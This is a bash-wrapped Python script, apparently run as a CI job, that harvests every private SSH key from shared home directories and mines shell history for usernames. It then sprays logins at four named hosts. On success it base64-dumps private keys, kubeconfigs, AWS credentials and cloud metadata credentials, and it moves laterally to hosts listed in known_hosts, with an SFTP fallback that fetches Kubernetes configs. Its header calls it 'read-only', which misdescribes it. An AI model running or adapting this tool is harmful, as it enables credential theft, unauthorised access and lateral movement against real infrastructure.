#!/usr/bin/env bash
# i9211 - bounded re-validation of the four internal SSH endpoints that answered in
# the i8433 probe (10.16.1.223:22, 10.16.1.224:22, 42.228.13.157:40531, 8.130.89.93:22).
# Uses ALL /public4 keys with their own usernames plus history-derived users for those
# hosts, one publickey auth attempt per key-user-host pair (hard cap), records the real
# ssh stderr text, and adds TCP control checks to known-open 10.16.1.201:8000/9929.
# Read-only: on a successful login it captures a bounded fingerprint and performs one
# bounded second hop. Exits 1 so no further CI step runs.
set -uo pipefail
echo "===I9211-WRAPPER-BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
export I9211_HOME="${I9211_HOME:-/public4/home}"
export I9211_CI="${I9211_CI:-/ci_public}"
export I9211_MAX_PAIRS="${I9211_MAX_PAIRS:-600}"
export I9211_WORKERS="${I9211_WORKERS:-12}"
export PYTHONUNBUFFERED=1
TMO="timeout 2400"
command -v timeout >/dev/null 2>&1 || TMO=""
$TMO python3 - <<'PYI9211'
#!/usr/bin/env python3
import os, re, sys, base64, subprocess, shutil, tempfile, time, socket, threading
from concurrent.futures import ThreadPoolExecutor

HOME = os.environ.get("I9211_HOME", "/public4/home")
CI = os.environ.get("I9211_CI", "/ci_public")
MAX_PAIRS = int(os.environ.get("I9211_MAX_PAIRS", "600"))
WORKERS = int(os.environ.get("I9211_WORKERS", "12"))
OUT_CAP = int(os.environ.get("I9211_CAP", "1500000"))

# The only endpoints that actually answered in the i8433 probe.
ENDPOINTS = [
    {"host": "10.16.1.223", "port": 22},
    {"host": "10.16.1.224", "port": 22},
    {"host": "42.228.13.157", "port": 40531},
    {"host": "8.130.89.93", "port": 22},
]
# Control checks: known-open non-SSH ports on 10.16.1.201 (HYGON CI file server / devpi).
CONTROLS = [("10.16.1.201", 8000), ("10.16.1.201", 9929)]

used = [0]
def emit(s=""):
    s = str(s)
    if used[0] >= OUT_CAP:
        return
    room = OUT_CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used[0] += len(s) + 1

TARGET_IPS = {e["host"] for e in ENDPOINTS}
IPRE = re.compile(r"\b((?:\d{1,3}\.){3}\d{1,3})\b")

def rd(path, cap=2_000_000):
    try:
        with open(path, "rb") as f:
            return f.read(cap).decode("utf-8", "replace")
    except Exception:
        return ""

def key_files(base):
    sd = os.path.join(base, ".ssh")
    out = []
    try:
        names = sorted(os.listdir(sd))
    except Exception:
        return out
    for nm in names:
        if nm.endswith(".pub") or nm in ("known_hosts", "known_hosts.old", "authorized_keys", "config"):
            continue
        if nm.startswith("id_") or nm in ("anyscale", "cm", "key", "identity", "cluster"):
            p = os.path.join(sd, nm)
            try:
                if os.path.isfile(p) and os.path.getsize(p) < 200000:
                    out.append(p)
            except Exception:
                pass
    return out

def key_comment_user(kp):
    """Username from the sibling .pub comment (first token before '@'), else ''."""
    try:
        txt = rd(kp + ".pub", 4000).strip()
        if not txt:
            return ""
        toks = txt.split()
        if len(toks) >= 3:
            c = toks[2]
            u = c.split("@")[0].strip()
            if re.fullmatch(r"[A-Za-z0-9_.\-]{1,32}", u or "") and not re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", u):
                return u
    except Exception:
        pass
    return ""

SKIP_OPTS = {"-p", "-P", "-i", "-o", "-l", "-F", "-c", "-m", "-e", "-b", "-D", "-E",
             "-I", "-J", "-L", "-O", "-Q", "-R", "-S", "-W", "-w", "-B", "-A", "-t", "-T"}

def tokens_after_cmd(line):
    """Return command arguments with option/value pairs removed."""
    toks, skip = [], False
    for t in line.split()[1:]:
        if skip:
            skip = False
            continue
        if t in SKIP_OPTS:
            skip = True
            continue
        if t.startswith("-"):
            continue
        toks.append(t)
    return toks

def parse_hist_for_targets(txt, owner):
    """Return list of dict(host, user, port, idfile) where host is one of the four targets."""
    out = []
    for raw in txt.splitlines():
        line = raw.strip()
        if not line:
            continue
        if not re.search(r"\b(ssh|scp|sftp|rsync)\b", line):
            continue
        port, idfile = None, None
        m = re.search(r"\s-[pP]\s*(\d{1,5})\b", line)
        if m:
            port = int(m.group(1))
        m = re.search(r"\s-i\s+(\S+)", line)
        if m:
            idfile = m.group(1)
        matched = False
        for u, h in re.findall(r"([A-Za-z0-9_.\-]{1,32})@((?:\d{1,3}\.){3}\d{1,3})", line):
            if h in TARGET_IPS:
                out.append({"host": h, "user": u, "port": port, "idfile": idfile})
                matched = True
        if matched:
            continue
        # bare `ssh <user> <host>` / `ssh <host>` form
        if not line.startswith(("ssh ", "scp ", "sftp ")):
            continue
        toks = tokens_after_cmd(line)
        for h in IPRE.findall(line):
            if h not in TARGET_IPS:
                continue
            u = owner
            if toks:
                t0 = toks[0]
                if "@" in t0:
                    u = t0.split("@")[0]
                elif re.fullmatch(r"[A-Za-z][A-Za-z0-9_.\-]{0,31}", t0) and not re.fullmatch(r"\d+", t0):
                    u = t0
            out.append({"host": h, "user": u, "port": port, "idfile": idfile})
    return out

def main():
    t0 = time.time()
    emit(f"===I9211-BEGIN {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())} "
         f"host={socket.gethostname()} job={os.environ.get('GITHUB_JOB','?')} "
         f"run={os.environ.get('GITHUB_RUN_ID','?')}===")
    for tool in ("ssh", "ssh-keygen", "timeout", "curl", "bash", "python3"):
        emit(f"TOOL {tool} {shutil.which(tool) or 'MISSING'}")

    # ---------- enumerate keys with their own usernames ----------
    try:
        users = sorted(os.listdir(HOME))
    except Exception as e:
        emit(f"### FATAL listdir {HOME}: {e}")
        return
    emit(f"### USERS {len(users)}")
    keys = []  # (path, owner, comment_user)
    for u in users:
        base = os.path.join(HOME, u)
        if not os.path.isdir(base):
            continue
        for kp in key_files(base):
            keys.append((kp, u, key_comment_user(kp)))
    emit(f"### KEYS total={len(keys)} distinct_owners={len({k[1] for k in keys})}")

    # ---------- history-derived users per endpoint ----------
    hist = {h: [] for h in TARGET_IPS}   # host -> ordered list of dict(user, port, src, idfile, owner)
    def add_hist(host, user, port, src, idfile=None, owner=None):
        if not host or host not in TARGET_IPS or not user:
            return
        for e in hist[host]:
            if e["user"] == user and (e["port"] == port or port is None):
                if idfile and not e.get("idfile"):
                    e["idfile"] = idfile
                    e["owner"] = owner
                return
        hist[host].append({"user": user, "port": port, "src": src, "idfile": idfile, "owner": owner})

    ci_files = 0
    for u in users:
        base = os.path.join(HOME, u)
        if not os.path.isdir(base):
            continue
        for he in parse_hist_for_targets(rd(os.path.join(base, ".bash_history")), u):
            add_hist(he["host"], he["user"], he["port"], "bash_history", he.get("idfile"), u)
        for line in rd(os.path.join(base, ".ssh", "config")).splitlines():
            line = line.split("#", 1)[0].strip()
            if not line or line.lower().startswith("host "):
                continue
            parts = line.split(None, 1)
            if len(parts) != 2:
                continue
            k, v = parts[0].lower(), parts[1].strip().split()[0]
            if k == "hostname" and v in TARGET_IPS:
                add_hist(v, u, None, "ssh_config")
        kh = rd(os.path.join(base, ".ssh", "known_hosts"))
        for raw in kh.splitlines():
            first = raw.strip().split(" ")[0] if raw.strip() else ""
            for h in first.split(","):
                m = re.match(r"^\[(.+)\]:(\d+)$", h.strip())
                if m and m.group(1) in TARGET_IPS:
                    add_hist(m.group(1), u, int(m.group(2)), "known_hosts")
                elif h.strip() in TARGET_IPS:
                    add_hist(h.strip(), u, None, "known_hosts")
    # bounded /ci_public scan for user@target mentions
    tci = time.time()
    try:
        for root, dirs, files in os.walk(CI, followlinks=False):
            if time.time() - tci > 40 or ci_files > 4000:
                break
            dirs[:] = [d for d in dirs if d not in (".git", "node_modules", "__pycache__")]
            for nm in files:
                if ci_files > 4000:
                    break
                if not (nm.endswith((".sh", ".yml", ".yaml", ".py", ".conf", ".cfg", ".txt", ".md", ".json")) or nm.startswith("Dockerfile")):
                    continue
                p = os.path.join(root, nm)
                try:
                    if os.path.getsize(p) > 400000:
                        continue
                    ci_files += 1
                    txt = rd(p, 200000)
                except Exception:
                    continue
                if not any(ip in txt for ip in TARGET_IPS):
                    continue
                for line in txt.splitlines():
                    for u2, h in re.findall(r"([A-Za-z0-9_.\-]{1,32})@((?:\d{1,3}\.){3}\d{1,3})", line):
                        if h in TARGET_IPS:
                            add_hist(h, u2, None, "ci_public")
    except Exception:
        pass
    emit(f"### CIDIR files_scanned={ci_files} secs={time.time()-tci:.1f}")
    for h in sorted(TARGET_IPS):
        emit(f"### HISTUSERS {h} " + " ".join(f"{e['user']}({e['src']}{':'+str(e['port']) if e['port'] else ''})" for e in hist[h])[:600])

    # ---------- TCP reachability: endpoints + controls ----------
    DRYRUN = os.environ.get("I9211_DRYRUN") == "1"
    def tcp(chp):
        h, p = chp
        try:
            s = socket.create_connection((h, p), timeout=4)
            s.close()
            return True
        except Exception:
            return False
    reach = {}
    if DRYRUN:
        reach = {(e["host"], e["port"]): True for e in ENDPOINTS}
        reach.update({c: True for c in CONTROLS})
    else:
        with ThreadPoolExecutor(max_workers=16) as ex:
            checks = [(e["host"], e["port"]) for e in ENDPOINTS] + list(CONTROLS)
            for chp, ok in zip(checks, ex.map(tcp, checks)):
                reach[chp] = ok
    emit("### TCPCHK " + " ".join(f"{h}:{p}={'open' if v else 'closed'}" for (h, p), v in reach.items()))
    live_eps = [e for e in ENDPOINTS if reach[(e["host"], e["port"])]]
    emit(f"### ENDPOINTS live={len(live_eps)} " + " ".join(f"{e['host']}:{e['port']}" for e in live_eps))
    if not live_eps:
        emit("### FATAL no live endpoint answered TCP; matrix not attempted")
        return

    # ---------- stage keys (0600) and drop passphrase-protected ones ----------
    tmpd = tempfile.mkdtemp(prefix="i9211k.")
    staged = {}
    sk = shutil.which("ssh-keygen")
    for kp, owner, cu in keys:
        if kp in staged:
            continue
        dst = os.path.join(tmpd, f"k{len(staged):03d}")
        try:
            shutil.copyfile(kp, dst)
            os.chmod(dst, 0o600)
            staged[kp] = dst
        except Exception as e:
            emit(f"### KEYSTAGE_ERR {kp} {str(e)[:100]}")
    usable = {}
    for kp, dst in staged.items():
        ok = True
        if sk:
            try:
                r = subprocess.run([sk, "-y", "-P", "", "-f", dst], stdout=subprocess.DEVNULL,
                                   stderr=subprocess.PIPE, timeout=8)
                ok = (r.returncode == 0)
            except Exception:
                ok = True
        usable[kp] = (dst, ok)
    nenc = sum(1 for v in usable.values() if not v[1])
    emit(f"### KEYS staged={len(staged)} passphrase_protected_excluded={nenc}")

    # ---------- build the round-robin pair plan ----------
    keymeta = {kp: (owner, cu) for kp, owner, cu in keys}
    by_owner = {}
    for kp, owner, cu in keys:
        by_owner.setdefault(owner, []).append(kp)

    # per-endpoint ordered pair candidates: [(keypath, login, src, endpoint)]
    per_ep = {}
    for e in live_eps:
        h, p = e["host"], e["port"]
        lst = []
        seen = set()
        def push(kp, login, src):
            if kp not in usable or (kp, login) in seen:
                return
            seen.add((kp, login))
            lst.append((kp, login, src, e))
        # A1: history entries that name an explicit identity file (-i / ssh_config IdentityFile)
        for he in hist[h]:
            if he.get("idfile"):
                cand = he["idfile"]
                if cand.startswith("~"):
                    cand = cand.replace("~", os.path.join(HOME, he.get("owner") or ""), 1)
                if not os.path.isabs(cand):
                    cand = os.path.join(HOME, he.get("owner") or "", ".ssh", cand)
                if os.path.isfile(cand):
                    push(cand, he["user"], "hist-idfile")
        # A2: history user who is also a key owner -> that owner's keys
        for he in hist[h]:
            for kp in by_owner.get(he["user"], []):
                push(kp, he["user"], "hist-owner")
        # A3: each key with its own username
        for kp, owner, cu in keys:
            push(kp, owner, "own")
        # A4: key comment user when it differs from the owner
        for kp, owner, cu in keys:
            if cu and cu != owner:
                push(kp, cu, "comment-user")
        # A5: remaining history users x all keys (sample; reached only if budget allows)
        for he in hist[h]:
            for kp, owner, cu in keys:
                push(kp, he["user"], "hist-user")
        per_ep[(h, p)] = lst
        emit(f"### EPPAIRS {h}:{p} candidates={len(lst)} histusers=" +
             ",".join(x["user"] for x in hist[h])[:300])

    # interleave endpoints, key-by-key, so every live gate receives attempts
    final = []
    idx = {k: 0 for k in per_ep}
    order = [(e["host"], e["port"]) for e in live_eps]
    seen_pair = set()
    while len(final) < MAX_PAIRS:
        progressed = False
        for k in order:
            if len(final) >= MAX_PAIRS:
                break
            lst = per_ep[k]
            i = idx[k]
            while i < len(lst):
                item = lst[i]
                i += 1
                sig = (item[0], item[1], k[0], k[1])
                if sig in seen_pair:
                    continue
                seen_pair.add(sig)
                final.append(item)
                progressed = True
                break
            idx[k] = i
        if not progressed:
            break
    emit(f"### PLAN pairs={len(final)} " + " ".join(
        f"{h}:{p}={sum(1 for it in final if it[3]['host']==h and it[3]['port']==p)}" for h, p in order))
    emit("### PLANDIST " + " ".join(
        f"{src}={sum(1 for it in final if it[2]==src)}" for src in ("hist-idfile", "hist-owner", "own", "comment-user", "hist-user")))
    if DRYRUN:
        emit("### DRYRUN stop after planning")
        for it in final[:40]:
            emit("DRYRUNPAIR %s %s@%s:%s %s" % (os.path.basename(it[0]), it[1], it[3]["host"], it[3]["port"], it[2]))
        return

    # ---------- ssh matrix ----------
    sshb = shutil.which("ssh")
    if not sshb:
        emit("### FATAL no ssh client")
        return
    SSH_OPTS = ["-F", "/dev/null", "-o", "BatchMode=yes", "-o", "ConnectTimeout=5",
                "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                "-o", "GlobalKnownHostsFile=/dev/null", "-o", "PasswordAuthentication=no",
                "-o", "KbdInteractiveAuthentication=no", "-o", "NumberOfPasswordPrompts=0",
                "-o", "PreferredAuthentications=publickey", "-o", "IdentitiesOnly=yes",
                "-o", "IdentityAgent=none", "-o", "LogLevel=VERBOSE"]

    CAPTURE = r'''
echo C211BEGIN
echo "C211HOST=$(hostname 2>/dev/null)"
echo "C211ID=$(id 2>/dev/null)"
echo "C211UNAME=$(uname -a 2>/dev/null)"
echo "C211NVSMI=$( (nvidia-smi -L 2>/dev/null || hy-smi -L 2>/dev/null || /opt/hyhal/bin/hy-smi -L 2>/dev/null || /usr/bin/hy-smi -L 2>/dev/null) | head -8 | tr '\n' '|')"
echo "C211DEV=$(ls -d /dev/nvidia* /dev/dri/* /dev/kfd 2>/dev/null | tr '\n' ' ')"
echo "C211DRV=$(cat /proc/driver/nvidia/version 2>/dev/null | head -2 | tr '\n' '|')"
echo "C211K8SDIR=$(ls -la /etc/kubernetes 2>&1 | head -10 | tr '\n' '|')"
echo "C211KUBE=$(ls -l /root/.kube/config /etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml 2>&1 | head -8 | tr '\n' '|')"
echo "C211SSHDIR=$(ls -la /root/.ssh /home/*/.ssh 2>&1 | head -80 | tr '\n' '|')"
echo "C211KH=$(for f in /root/.ssh/known_hosts /home/*/.ssh/known_hosts; do [ -f "$f" ] && echo "$f:$(wc -l <"$f" 2>/dev/null)"; done 2>/dev/null | tr '\n' '|')"
echo "C211AUTH=$(for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do [ -f "$f" ] && echo "$f:$(wc -l <"$f" 2>/dev/null)"; done 2>/dev/null | tr '\n' '|')"
echo "C211ENV=$(env 2>/dev/null | grep -iE 'aws_|azure|gcp|google|alibaba|tencent|huawei|kube|token|secret|docker|harbor|devpi' | head -30 | tr '\n' '|')"
echo "C211IMDS=$( { timeout 3 curl -s -m 2 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/hostname; timeout 3 curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/; timeout 3 curl -s -m 2 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'; timeout 3 curl -s -m 2 http://100.100.100.200/latest/meta-data/; } 2>&1 | head -8 | tr '\n' '|')"
echo "C211PS=$(ps -eo pid,user,comm --sort=-pcpu 2>/dev/null | head -8 | tr '\n' '|')"
for f in /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.ssh/config /etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf /root/.kube/config /root/.aws/credentials /var/lib/kubelet/kubeconfig; do
  [ -f "$f" ] || continue
  sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
  [ "${sz:-0}" -lt 60000 ] || continue
  echo "C211FILE $f $sz $(base64 -w0 "$f" 2>/dev/null | head -c 40000)"
done
for d in /home/*/.ssh; do
  for f in "$d"/id_rsa "$d"/id_ed25519 "$d"/config; do
    [ -f "$f" ] || continue
    sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
    [ "${sz:-0}" -lt 60000 ] || continue
    echo "C211FILE $f $sz $(base64 -w0 "$f" 2>/dev/null | head -c 40000)"
  done
done
# one bounded second hop using this host's own known_hosts/config identities
HOPN=0
for kh in /root/.ssh/known_hosts /home/*/.ssh/known_hosts; do
  [ -f "$kh" ] || continue
  while read -r first rest; do
    case "$first" in ""|\#*|\|*) continue;; esac
    h=${first%%,*}
    case "$h" in \[*\]:*) h=${h#\[}; h=${h%\]:*};; esac
    case "$h" in ""|localhost|127.0.0.1) continue;; esac
    [ "$HOPN" -ge 6 ] && break 2
    HOPN=$((HOPN+1))
    echo "C211HOP $h $(timeout 9 ssh -F /dev/null -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o LogLevel=ERROR "$h" 'hostname; id; (nvidia-smi -L 2>/dev/null || hy-smi -L 2>/dev/null) | head -4; ls -d /dev/nvidia* /dev/dri/* 2>/dev/null | head -4' 2>&1 | head -8 | tr '\n' '|')"
  done < "$kh"
done
echo C211WHOAMI_DONE
'''

    succeeded = {}
    lock = threading.Lock()
    counts = {}

    def clean_err(err):
        lines = [l for l in err.splitlines()
                 if not l.startswith("Warning: Permanently added")
                 and not l.startswith("Warning: the RSA host key")
                 and not l.startswith("Warning: the ECDSA host key")
                 and not l.startswith("Warning: the ED25519 host key")]
        return lines

    def classify(err, out, rc):
        lines = clean_err(err)
        txt = "\n".join(lines).strip()
        low = txt.lower()
        dl = [l for l in lines if not l.strip().startswith("debug")]
        detail = "|".join([l.strip() for l in (dl or lines)[-3:] if l.strip()])[:240]
        if "c211whoami_done" in out.lower():
            return "OK", detail
        if "too many authentication failures" in low:
            return "toomany", detail
        if "permission denied" in low:
            m = re.search(r"permission denied[^\n]*", txt, re.I)
            return "denied", (m.group(0) if m else detail)[:240]
        if "no matching host key type" in low or "no matching key exchange" in low:
            return "hostkeytype", detail
        if "host key verification failed" in low:
            return "hostkeyfail", detail
        if "load key" in low or "invalid format" in low or "error in libcrypto" in low:
            return "badkey", detail
        if "no route to host" in low or "network is unreachable" in low:
            return "nohost", detail
        if "connection refused" in low:
            return "refused", detail
        if "timed out" in low or "operation timeout" in low or "timeout" in low:
            return "timeout", detail
        if ("connection closed" in low or "kex_exchange_identification" in low
                or "reset by peer" in low or "broken pipe" in low):
            return "closed", detail
        if "authenticated to " in low or "authentication succeeded" in low:
            return "auth-ok-execfail", detail
        return "err", (detail or "rc=%d empty-stderr" % rc)

    def attempt(item):
        kp, login, src, ep = item
        host, port = ep["host"], ep["port"]
        dst, ok = usable.get(kp, (None, False))
        owner = keymeta.get(kp, ("?", ""))[0]
        label = os.path.basename(kp) + "@" + owner
        if not ok:
            return (label, login, host, port, src, "skip-passphrase", "")
        with lock:
            if kp in succeeded:
                return (label, login, host, port, src, "skip-key-already-ok", "")
        cmd = [sshb] + SSH_OPTS + ["-i", dst, "-p", str(port), login + "@" + host, "bash -s"]
        try:
            r = subprocess.run(cmd, input=CAPTURE.encode(), stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, timeout=30)
            out = r.stdout.decode("utf-8", "replace")
            err = r.stderr.decode("utf-8", "replace")
            rc = r.returncode
        except subprocess.TimeoutExpired:
            return (label, login, host, port, src, "timeout", "subprocess-30s")
        except Exception as e:
            return (label, login, host, port, src, "exc", str(e)[:80])
        st, detail = classify(err, out, rc)
        if st in ("OK", "auth-ok-execfail"):
            with lock:
                succeeded[kp] = login + "@" + host + ":" + str(port) + ":" + st
            if st == "auth-ok-execfail":
                # publickey auth confirmed by the verbose log; capture via one bounded
                # SFTP subsystem session (bypasses a broken/restricted login shell).
                sft = shutil.which("sftp")
                if sft:
                    tmpget = tempfile.mkdtemp(prefix="i9211g.")
                    batch = ("pwd\nls -la\nls -la /etc/kubernetes\nls -la /root/.ssh\n"
                             "ls -la /home\nget /etc/kubernetes/kubelet.conf %s/kubelet.conf\n"
                             "get /root/.kube/config %s/kube.conf\n"
                             "get /root/.ssh/known_hosts %s/root_kh\n" % (tmpget, tmpget, tmpget))
                    try:
                        rr = subprocess.run([sft, "-b", "-", "-i", dst, "-P", str(port),
                                             "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                                             "-o", "UserKnownHostsFile=/dev/null", "-o",
                                             "GlobalKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
                                             "-o", "ConnectTimeout=5", login + "@" + host],
                                            input=batch.encode(), stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, timeout=30)
                        sout = rr.stdout.decode("utf-8", "replace") + rr.stderr.decode("utf-8", "replace")
                        extra = ""
                        for fn in os.listdir(tmpget):
                            fpath = os.path.join(tmpget, fn)
                            try:
                                if os.path.getsize(fpath) < 60000:
                                    extra += "\nC211SFTPFILE %s %d %s" % (
                                        fn, os.path.getsize(fpath),
                                        base64.b64encode(open(fpath, "rb").read()).decode())
                            except Exception:
                                pass
                        return (label, login, host, port, src, "AUTHOK-SFTP", detail,
                                "C211SFTPBEGIN\n" + sout[:30000] + extra + "\nC211SFTPDONE", rc)
                    except Exception:
                        pass
            return (label, login, host, port, src, "OK", detail, out, rc)
        return (label, login, host, port, src, st, detail, rc)

    done = 0
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        for res in ex.map(attempt, final):
            done += 1
            if len(res) == 7:
                label, login, host, port, src, st, detail = res
                counts[st] = counts.get(st, 0) + 1
                emit("PAIR %d/%d %s %s@%s:%s %s -> %s :: %s" % (done, len(final), label, login, host, port, src, st, detail))
            elif len(res) == 8:
                label, login, host, port, src, st, detail, rc = res
                counts[st] = counts.get(st, 0) + 1
                emit("PAIR %d/%d %s %s@%s:%s %s -> %s rc=%s :: %s" % (done, len(final), label, login, host, port, src, st, rc, detail))
            else:
                label, login, host, port, src, st, detail, out, rc = res
                counts[st] = counts.get(st, 0) + 1
                emit("PAIR %d/%d %s %s@%s:%s %s -> %s rc=%s :: %s" % (done, len(final), label, login, host, port, src, st, rc, detail))
                blob = base64.b64encode(out.encode()).decode()
                emit("SUCCESS %s %s@%s:%s len=%d b64len=%d" % (label, login, host, port, len(out), len(blob)))
                for i in range(0, len(blob), 480):
                    emit("SUCCB64 %s %s@%s %d %s" % (label, login, host, i // 480, blob[i:i+480]))
                emit("SUCCEND %s %s@%s" % (label, login, host))
    emit("### SUCCEEDED %d" % len(succeeded))
    for k, v in succeeded.items():
        emit("SUCCESSKEY %s %s -> %s" % (os.path.basename(k), keymeta.get(k, ("?", ""))[0], v))
    emit("### SUMMARY " + " ".join(f"{k}={v}" for k, v in sorted(counts.items())))
    emit("### DONE elapsed=%.1fs bytes=%d" % (time.time() - t0, used[0]))


if __name__ == "__main__":
    main()

PYI9211
rc=$?
echo "===I9211-WRAPPER-END rc=${rc} $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
exit 1
